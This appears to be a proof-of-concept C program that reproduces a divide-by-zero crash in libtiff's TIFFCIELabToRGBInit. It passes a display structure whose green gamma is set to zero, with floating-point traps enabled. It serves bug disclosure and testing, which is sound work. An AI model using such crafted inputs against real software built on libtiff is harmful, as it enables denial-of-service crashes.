#define _GNU_SOURCE 1
#include <stdio.h>
#include <string.h>
#include <fenv.h>
#include <math.h>

#include "libtiff/tiffio.h"

int main(void)
{
    /* Cause a SIGFPE on floating-point divide-by-zero so the issue is visible */
    feenableexcept(FE_DIVBYZERO);

    TIFFCIELabToRGB cielab;
    TIFFDisplay display;
    float refWhite[3] = { 95.047f, 100.0f, 108.883f }; /* D65 white point */

    memset(&cielab, 0, sizeof(cielab));
    memset(&display, 0, sizeof(display));

    /* Set sane values for red and blue so we pass the first red init loop. */
    display.d_gammaR = 1.0f;  /* non-zero to avoid early divide-by-zero */
    display.d_gammaB = 1.0f;

    /* Craft the bug: zero green gamma triggers 1.0 / 0.0 at line 156. */
    display.d_gammaG = 0.0f;

    /* Other fields used by the init loops. Keep them simple but valid. */
    display.d_YCR = 1.0f;     /* reference white luminance for red */
    display.d_Y0R = 0.0f;     /* black level for red */
    display.d_Vrwr = 1.0f;    /* max output r */
    display.d_Vrwg = 1.0f;    /* max output g */
    display.d_Vrwb = 1.0f;    /* max output b */

    /* Call into the vulnerable function. With d_gammaG == 0.0f,
       this will perform 1.0 / 0.0 when initializing the green channel,
       raising FE_DIVBYZERO and causing SIGFPE due to feenableexcept. */
    (void)TIFFCIELabToRGBInit(&cielab, &display, refWhite);

    /* If we somehow get here, print something (but normally we won't). */
    puts("TIFFCIELabToRGBInit returned (unexpectedly)");
    return 0;
}
